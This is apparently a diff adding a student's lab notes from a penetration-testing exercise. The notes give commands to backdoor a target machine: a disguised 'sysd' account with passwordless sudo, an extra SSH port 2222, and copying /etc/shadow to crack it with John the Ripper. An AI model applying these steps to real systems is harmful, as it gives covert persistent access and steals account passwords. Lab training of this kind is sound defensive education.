@@ -1,0 +1,34 @@
+1. In this step, you'll create a "secret" user named sysd. Anyone examining /etc/passwd will assume this is a service a service account, 
+but in fact, you'll be using it to reconnect to the target machine for further exploitation.
+2. In this step, you'll allow SSH access via port 2222. SSH usually runs on port 22, but opening port 2222 will allow 
+you to log in as your secret sysd user without connecting to the standard (and well-guarded) port 22.
+3. When you think you've configured things properly, test your solution by testing the new backdoor SSH port.
+4. Next, to strengthen our control of this system, we will attempt to crack as many passwords as we can.
+Having access to all the accounts will also allow us to access the system if our other backdoors are closed.
+
+Step 1: Shadow People
+sudo adduser sysd
+sudo usermod -u 500 sysd
+Sudo groupmod -g 500 sysd
+A. sudo visudo *scroll down all the way
+B. sysd ALL=(ALL:ALL) NOPASSWD:ALL
+su sysd
+sudo -l
+Other Command: Did sudo visudo, gained access to the etc/sudoers
+
+Step 2: Smooth Sailing
+nano /etc/ssh/sshd_config
+*under port 22, add port 2222
+
+Step 3: Testing Your Configuration Update
+sudo systemctl restart ssh
+exit *then root user access will pop up.
+ssh sysd@192.168.6.105 -p 2222
+sudo su
+
+Step 4: Crack All the Passwords
+ssh sysd@192.168.6.105 -p 2222
+A. sudo su
+B. cp /etc/shadow shadow.txt
+C. john shadow.txt
+D. john --show shadow.txt
